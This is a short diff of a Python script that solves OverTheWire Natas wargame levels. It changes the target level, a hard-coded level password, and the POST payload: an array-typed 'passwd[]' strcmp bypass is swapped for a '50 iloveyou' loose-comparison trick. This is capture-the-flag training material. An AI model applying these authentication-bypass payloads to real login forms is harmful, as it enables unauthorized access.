@@ -3,9 +3,9 @@
 import requests
 import re
 
-usn = 'natas24'
-url = 'http://%s.natas.labs.overthewire.org/' % usn
-passwd = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'
+usn = 'natas23'
+url = 'http://%s.natas.labs.overthewire.org/?revelio=1' % usn
+passwd = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'
 login = (usn, passwd)
 
 request = requests.Session()
@@ -16,6 +16,6 @@ def get_source_code():
 
 
 def solve_lab():
-  connection = request.post(url, data = {'passwd[]':'anything'}, auth = login)
+  connection = request.post(url, data = {"passwd":"50 iloveyou "}, auth = login)
   pageContent = connection.text 
   print pageContent
